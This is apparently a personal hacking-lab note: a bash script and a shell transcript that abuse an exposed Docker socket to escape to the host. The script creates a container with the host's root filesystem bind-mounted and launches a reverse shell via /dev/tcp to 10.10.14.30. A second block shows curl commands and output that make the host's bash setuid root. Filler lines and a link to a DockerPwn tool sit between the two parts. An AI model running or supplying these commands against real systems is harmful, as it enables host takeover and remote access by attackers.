#!/bin/bash

# you can see images availables with
# curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
# here we have sandbox:latest

# command executed when container is started
# change dir to tmp where the root fs is mount and execute reverse shell

cmd="[\"/bin/sh\",\"-c\",\"chroot /tmp sh -c \\\"bash -c 'bash -i &>/dev/tcp/10.10.14.30/12348 0<&1'\\\"\"]"

# create the container and execute command, bind the root filesystem to it, name the container peterpwn_root and execute as detached (-d)
curl -s -X POST --unix-socket /var/run/docker.sock -d "{\"Image\":\"sandbox\",\"cmd\":$cmd,\"Binds\":[\"/:/tmp:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create?name=peterpwn_root

# start the container
curl -s -X POST --unix-socket /var/run/docker.sock "http://localhost/containers/peterpwn_root/start"

<br>
###############
###############
##
##
<br>
<br>
https://github.com/AbsoZed/DockerPwn.py
<br>


Things.
And.
Things.
<br>
<br>

$ payload="[\"/bin/sh\",\"-c\",\"chroot /mnt && sh -c \\\"chmod u+s /mnt/bin/bash\\\"\"]" 
$ curl -s -XPOST --unix-socket /app/docker.sock -d "{\"Image\":\"VULN-app_main\",\"cmd\":$payload, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create
{"Id":"e9f4a10370ec5e2b616e09e2d9e97f11c7f13931380af5063c13cb72254ffce2","Warnings":[]}
$ 
$ 
$ 
$ curl -s -XPOST --unix-socket /app/docker.sock http://localhost/containers/7325a8f5bd7388d82763f1276645ccb0733486a034734cad81c2bf8dbc554992/start
{"message":"No such container: 7325a8fe9f4a10370ec5e2b616e09e2d9e97f11c7f13931380af5063c13cb72254ffce"}
$ 
$ curl -s -XPOST --unix-socket /app/docker.sock http://localhost/containers/7325a8f5bd7388d82763f1276645ccb0733486a034734cad81c2bf8dbc554992/start
{"message":"No such container: 7325a8f5e9f4a10370ec5e2b616e09e2d9e97f11c7f13931380af5063c13cb72254ffc"}
$ 
$ curl -s -XPOST --unix-socket /app/docker.sock http://localhost/containers/e9f4a10370ec5e2b616e09e2d9e97f11c7f13931380af5063c13cb72254ffce2/start
$ 
$ 
$ 
